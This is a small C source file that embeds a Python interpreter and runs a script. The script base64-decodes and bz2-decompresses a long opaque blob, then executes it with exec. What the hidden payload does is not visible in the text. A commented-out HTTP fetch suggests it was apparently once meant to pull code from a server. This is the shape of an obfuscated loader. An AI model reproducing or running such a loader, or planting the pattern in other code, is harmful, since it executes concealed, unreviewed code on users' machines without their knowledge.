//#define ARCH_LINUX
#define DEBUG
#include <stdlib.h>
#include <Python.h>
//#include "embed.h"
#include "http.h"
#include "const.h"

int main(int argc, char *argv[])
{
	char output[HTTP_CONTENT_MAXSIZE] = "\0";
	//http_get("127.0.0.1", 5000, argv[1], output, HTTP_CONTENT_MAXSIZE);
	Py_Initialize();
	printf("Executing...\n%s>", output);
	int count = 0;
	int stop = 0;
	char pythonScript[] = "import bz2, base64\nexec(bz2.decompress(base64.b64decode('QlpoOTFBWSZTWUiVyIQABCDfgHAQcv/3V3vv3i6//9/6YAb8+r2XQV26YbrKFKBQGGpk1MKaPSTwiGgaYmRp4oaaAaAGTQDhppkYjCaYCGATTCMExMhpkaGgGmQiE1T1PMlPak9Q0eo0eo9Q9QABoAGg0EmpCEakeUnlHiGoeoeoAMNCekyPU9EGjT1DhppkYjCaYCGATTCMExMhpkaGgEiSZGgQCDJqYRomJ6jQNNGmj1NGTTQ9S8hyGrFUiKh0p+aRf+qnqMHX6MHqtl2XpO1M0CxVU01VDdzsUJezb2Vxe++TkmdsJIbVIh+3eTR13U+TLmZNf34+/42z5EAbxIGMSrBYiKCiMFFYxYiCoo2mhLTBYqQEj+IlIHCco5LIy7KWDKIh1P5krT1xzR963hyVLM5Jm1nD/C93Y0FU5xlNmNKJgKRmWlUZmbC/G53v8dtdqpvqw7RXVwJpYvjZMbGYTd4LaaSVllpa8ESLa1ks4oUpgl0Ho7zDpyE8u8NlW0Fx49k8iA0qWbfBO/mz/7n8RgAu6cI9qYtXAuZr03c4vf1t7c6+YSUAzdYhqlEoaWTML7KXVKYJFNQuwcX6ttnYgmBCbBEONaQKK4y1dqjAkpJqEOTMzO62lT4MUaVtiAqmK/kntd7itZJd3Dc+d5pbzp5pOFJHQ3UF8em6+VfY7U4pwfXLRi72kWELXLTCIueXsuvFw5a1ejB5KbfFkZoqdINlLMrC0sKTJD5Uhp5BrxcVFLQODgOMEBm4QqqDXLRiSAJTA42oS0B2zClyXA+RKhTjYbOTbtPHZMeEUKqyhxaO47j2No0jDHj2wiNBR6SydHrFHgYFNkwQNVgrtntdP+aKsRvOpk+n1Z1uwZLs9mvnGrxyeMsH5rXsJwG2MBIxpMECJblrGZar8RtjaJiFY+dY6ME8VJZfYQq5cEa/Llv/n7uZnrj3JSMQ/rm24vj8aGqPK/w6j8CQxhB32NMBrcIwKjYLJ6RFvFhVxKPYFB2QfOXH3V14q5Vo9V4KVNkr5VWqUCToEgqW4BGSyIRtBXSCnFP7vDkGQyg4D4ObEynTf5jvDkRefWGuxL2nymBuEIt++5ZY6hrcQHD1hbpSu9KRoYWJHaIa2rmHy7T/WSI0Z6TfrD6PJuORI8EXcZK8LksMirPWldIWJDPmZlbHeYQ5SZVmk1f110DOhBoOchaBvWGGR3TVdX3HxBqTdvUxHMex4doKLGJ3DjnDQuYWQwbPZSszQdEhjrOpI7OynjqQ71XVJJE1y1Pute3pyvoF6vViwl4bUhsdZVRYt1xqXiPOpIgopXkKhKLZQODARgkcE14BBIJIDgYJJV+eK2YGpMx2tFxhoSxLLP1JK855n1W6wq3NnB6zVmC5A2w6DuUxdQffz8SCoxGCA2DNSSU9RzE9Bs2YYWIhBxdvBm9paXBB0zOOF92NqWa3MFAwG0+UX6SDXuIg2a/IaNj8fRCFd+fZXi21ZO4Yy8gG0nrFaQgfxMgt1G5NK6TGtjx5p3ooF9TrRRUXsbPpOv0BwFcXnYjXc9NX1LsWximxzXN/NJ8xzmAYuznsXkk04DGi6uWZmaCYNnwcq5EFJBkdEuAxN2Wl9FWYgM2BqJo028EdnHsvnoMzFJxAxtJwoUNpqxaqu0Q3DN8EqJDBkGW0Ps6GqYg1BBZnjEmcnDVje517yWW5xmiE02DW1q+4CAmNNTR7pQFriaZvXeeLSEkvScBdKXgxjs19wmTC9Ws94KSX4My568AKor5cTzlnalV099oF3OHowv8t5PaFN8ZESnzht51p1HVdCVaRcl050C8apmqYAVcy0KOwlYEn3YeRl4U8xTThUCRMxg0TRgwO5hFRHbJVKJb/QGSLGK0Yg1FOU1ksX3TrFQ3LI9RMjbOTxJs4KjNNKvN4GeTJ27xomOSzvgmO+K3kBuEefz7Q6mDGFjVDXDw0gSR2zFlItu6CZkZ8OBR3SkZkrIIstsJzgPAuDA6a4l0Q419QZbQYa05DhjVdmya9RlKOKLNh1YUpjQuV5tSGFS1ASsG8GNkK61E2KdkxpItOayzKmDYXG8B+oaXbsUB2mQtGrQINZO88RlmLoQuYWJYuTv0cOJUmHHo6WbLuNamkQezT4sdpfy9yVYNGRsyUZHKHYmks+hPamSoXAT5WkYz/xdyRThQkEiVyIQA=')))";
	printf("pythonScript: %s", pythonScript);
	int result = PyRun_SimpleString(pythonScript);
	Py_Finalize();
}

